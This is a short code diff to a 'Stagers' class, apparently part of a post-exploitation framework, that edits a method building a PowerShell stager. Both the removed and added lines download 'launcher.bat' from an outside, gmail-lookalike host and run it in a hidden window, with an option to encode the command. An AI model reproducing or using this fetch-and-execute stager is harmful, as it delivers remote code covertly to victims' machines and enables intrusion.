@@ -278,7 +278,7 @@ class Stagers:
         return server + checksum
 
     def generate_launcher_fetcher(self, encode=True):
-        stager = 'wget "http://www.grnail.us/launcher.bat" -outfile "launcher.bat"; $A = Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden; $a.ExitCode'
+        stager = 'wget "http://www.grnail.us/launcher.bat" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
 	if encode:
             return helpers.powershell_launcher(stager)
         else:
